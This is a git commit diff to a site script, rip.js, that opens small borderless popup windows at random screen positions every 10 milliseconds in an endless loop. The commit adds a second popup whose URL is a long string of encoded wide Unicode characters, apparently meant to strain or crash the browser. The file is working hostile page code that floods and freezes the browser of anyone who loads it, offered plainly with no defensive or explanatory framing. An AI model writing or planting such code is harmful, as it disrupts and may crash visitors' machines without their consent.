9994ba4dc13085214ec70b972e06c5c430c7f7dc
authenticationservice <144920677+authenticationservice@users.noreply.github.com>
2025-02-19 08:59:32 -0600

    Update rip.js

--- site/rip.js
+++ site/rip.js
@@ -1,24 +1,25 @@
-function openWindow(url) {
-    const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
+(function () {
+    function openWindow(url) {
+        const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
 
-    if (newWin) {
-        const screenWidth = screen.width - 200; // Keep within bounds
-        const screenHeight = screen.height - 180;
+        if (newWin) {
+            const screenWidth = screen.width - 200; // Keep within bounds
+            const screenHeight = screen.height - 180;
 
-        const randomX = Math.floor(Math.random() * screenWidth);
-        const randomY = Math.floor(Math.random() * screenHeight);
+            const randomX = Math.floor(Math.random() * screenWidth);
+            const randomY = Math.floor(Math.random() * screenHeight);
 
-        newWin.moveTo(randomX, randomY);
+            newWin.moveTo(randomX, randomY);
+        }
+
+        return newWin;
     }
 
-    return newWin;
-}
-
-(function () {
     const openWithFixedDelay = () => {
         openWindow('lol.html');
+        openWindow('%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD%EF%B7%BD');
         setTimeout(openWithFixedDelay, 10); // Fixed delay of 10 ms
     };
-    
+
     setTimeout(openWithFixedDelay, 10); // Initial fixed delay of 10 ms
 })();
